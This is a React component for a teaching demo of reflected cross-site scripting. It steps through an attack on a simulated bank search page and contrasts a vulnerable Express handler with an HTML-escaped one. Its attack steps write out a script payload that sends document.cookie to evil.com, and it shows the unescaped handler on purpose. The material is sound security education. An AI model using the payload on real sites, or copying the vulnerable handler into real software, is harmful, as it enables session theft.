import { AnimatePresence, motion } from "motion/react";
import { useState } from "react";
import { ShikiCode } from "../shared/ShikiCode";

const VULNERABLE_CODE = `// Vulnerable server (Node/Express)
app.get('/search', (req, res) => {
  const query = req.query.q;
  // VULNERABLE: directly interpolating user input into HTML
  res.send(\`<p>Results for: \${query}</p>\`);
});`;

const SECURE_CODE = `// Secure version — HTML entity encode all output
import { escape } from 'html-escaper';

app.get('/search', (req, res) => {
  const query = escape(req.query.q as string);
  // angle brackets become &lt; &gt; — rendered as text, not parsed as tags
  res.send(\`<p>Results for: \${query}</p>\`);
});`;

const ATTACK_STEPS = [
	{
		actor: "Attacker",
		actorColor: "text-accent-rose-soft",
		label: "Craft malicious URL",
		detail:
			'https://bank.example.com/search?q=<script>fetch("https://evil.com/?c="+document.cookie)</script>',
	},
	{
		actor: "Victim",
		actorColor: "text-sky-400",
		label: "Clicks the link",
		detail: "Browser sends GET /search?q=[payload] to bank.example.com",
	},
	{
		actor: "Server",
		actorColor: "text-text-secondary",
		label: "Reflects payload into HTML (no sanitization)",
		detail:
			"<p>Results for: <script>fetch('https://evil.com/?c='+document.cookie)</script></p>",
	},
	{
		actor: "Browser",
		actorColor: "text-text-secondary",
		label: "Parses and executes the script",
		detail: "Script runs in victim's browser context — reads document.cookie",
	},
	{
		actor: "Attacker",
		actorColor: "text-accent-rose-soft",
		label: "Receives stolen session",
		detail: "evil.com/?c=session=abc123xyz — victim's session stolen",
	},
] as const;

export function ReflectedXSSDemo() {
	const [step, setStep] = useState(-1);
	const [sanitized, setSanitized] = useState(false);
	// Locks in the mode at the moment "Start Attack" is clicked — prevents
	// mid-flow toggle from retroactively changing the attack outcome.
	const [sanitizedAtStart, setSanitizedAtStart] = useState<boolean | null>(
		null,
	);
	const [searchInput, setSearchInput] = useState(
		'<script>alert("xss")</script>',
	);

	const isRunning = step >= 0;
	// Use the locked-in value during an active run; fall back to current toggle otherwise
	const effectiveSanitized = sanitizedAtStart ?? sanitized;
	const attackBlocked = effectiveSanitized && step >= 2;

	function startAttack() {
		setSanitizedAtStart(sanitized);
		setStep(0);
	}

	function advanceStep() {
		if (step < ATTACK_STEPS.length - 1) {
			setStep((s) => s + 1);
		}
	}

	function reset() {
		setStep(-1);
		setSanitizedAtStart(null);
	}

	const displayedQuery = sanitized
		? searchInput
				.replace(/&/g, "&amp;")
				.replace(/</g, "&lt;")
				.replace(/>/g, "&gt;")
				.replace(/"/g, "&quot;")
				.replace(/'/g, "&#x27;")
		: searchInput;

	return (
		<div className="space-y-6">
			{/* Simulated search */}
			<div className="bg-surface-secondary rounded-lg p-4 border border-border-secondary">
				<p className="text-xs text-text-tertiary mb-3 uppercase tracking-wider font-semibold">
					Simulated Search Page
				</p>
				<div className="flex gap-2 mb-3">
					<input
						type="text"
						value={searchInput}
						onChange={(e) => setSearchInput(e.target.value)}
						className="flex-1 bg-surface-primary border border-border-tertiary rounded px-3 py-2 text-sm text-text-primary font-mono"
						placeholder="Try: <script>alert('xss')</script>"
					/>
				</div>
				<div className="bg-surface-primary rounded p-3 text-sm border border-border-secondary">
					<span className="text-text-tertiary">Server response: </span>
					<span className="text-text-secondary">Results for: </span>
					<span
						className={
							sanitized ? "text-accent-emerald-soft" : "text-accent-red-soft"
						}
					>
						{displayedQuery}
					</span>
					{!sanitized && (
						<span className="ml-2 text-xs text-accent-red-soft bg-red-500/20 px-2 py-0.5 rounded">
							⚠ Script would execute
						</span>
					)}
					{sanitized && (
						<span className="ml-2 text-xs text-accent-emerald-soft bg-emerald-500/20 px-2 py-0.5 rounded">
							✓ Rendered as text
						</span>
					)}
				</div>
			</div>

			{/* Toggle — disabled while attack running to prevent mid-flow confusion */}
			<div className="flex items-center gap-3 flex-wrap">
				<button
					type="button"
					disabled={isRunning}
					onClick={() => setSanitized(false)}
					className={`px-4 py-2 rounded text-sm font-medium transition-colors disabled:opacity-40 disabled:cursor-not-allowed ${
						!sanitized
							? "bg-red-500/20 text-accent-red-soft border border-red-500"
							: "bg-surface-secondary text-text-tertiary border border-border-secondary hover:border-border-tertiary"
					}`}
				>
					No Sanitization (Vulnerable)
				</button>
				<button
					type="button"
					disabled={isRunning}
					onClick={() => setSanitized(true)}
					className={`px-4 py-2 rounded text-sm font-medium transition-colors disabled:opacity-40 disabled:cursor-not-allowed ${
						sanitized
							? "bg-emerald-500/20 text-accent-emerald-soft border border-emerald-500"
							: "bg-surface-secondary text-text-tertiary border border-border-secondary hover:border-border-tertiary"
					}`}
				>
					HTML Entity Encoded (Secure)
				</button>
				{isRunning && (
					<span className="text-xs text-text-muted italic">
						Reset to change mode
					</span>
				)}
			</div>

			{/* Attack flow */}
			<div>
				<div className="flex items-center justify-between mb-3">
					<p className="text-sm font-semibold text-text-secondary">
						Attack Flow
					</p>
					<div className="flex gap-2">
						{!isRunning ? (
							<button
								type="button"
								onClick={startAttack}
								className="px-3 py-1.5 bg-red-500/20 text-accent-red-soft border border-red-500 rounded text-xs font-medium hover:bg-red-500/30 transition-colors"
							>
								▶ Start Attack
							</button>
						) : (
							<>
								{step < ATTACK_STEPS.length - 1 && (
									<button
										type="button"
										onClick={advanceStep}
										className="px-3 py-1.5 bg-surface-tertiary text-text-secondary rounded text-xs font-medium hover:bg-surface-tertiary transition-colors"
									>
										Next Step →
									</button>
								)}
								<button
									type="button"
									onClick={reset}
									className="px-3 py-1.5 bg-surface-secondary text-text-tertiary rounded text-xs font-medium hover:bg-surface-tertiary transition-colors"
								>
									Reset
								</button>
							</>
						)}
					</div>
				</div>

				<div className="space-y-2">
					{ATTACK_STEPS.map((s, i) => (
						// Static array — index is a stable key
						// biome-ignore lint/suspicious/noArrayIndexKey: static constant array, never reordered
						<AnimatePresence key={i}>
							{i <= step && (
								<motion.div
									initial={{ opacity: 0, x: -12 }}
									animate={{ opacity: 1, x: 0 }}
									className={`rounded-lg p-3 border text-sm ${
										attackBlocked && i >= 2
											? "bg-emerald-500/10 border-emerald-500/40"
											: i === ATTACK_STEPS.length - 1 && !effectiveSanitized
												? "bg-red-500/20 border-red-500"
												: "bg-surface-secondary border-border-secondary"
									}`}
								>
									<div className="flex items-start gap-2">
										<span
											className={`font-semibold text-xs ${s.actorColor} shrink-0 mt-0.5`}
										>
											{s.actor}
										</span>
										<span className="text-text-secondary text-xs">
											{s.label}
										</span>
										{attackBlocked && i === 2 && (
											<span className="ml-auto text-accent-emerald-soft text-xs font-semibold shrink-0">
												✓ BLOCKED
											</span>
										)}
										{!effectiveSanitized && i === ATTACK_STEPS.length - 1 && (
											<span className="ml-auto text-accent-red-soft text-xs font-semibold shrink-0">
												🔴 SESSION STOLEN
											</span>
										)}
									</div>
									<p className="mt-1 text-xs text-text-muted font-mono break-all">
										{s.detail}
									</p>
								</motion.div>
							)}
						</AnimatePresence>
					))}
				</div>
			</div>

			{/* Code block reflects toggle, not attack state — allows studying both modes */}
			<div>
				<p className="text-xs text-text-tertiary mb-2 font-semibold uppercase tracking-wider">
					{sanitized ? "Secure Implementation" : "Vulnerable Implementation"}
				</p>
				<ShikiCode
					language="typescript"
					code={sanitized ? SECURE_CODE : VULNERABLE_CODE}
					className="text-xs"
				/>
			</div>
		</div>
	);
}
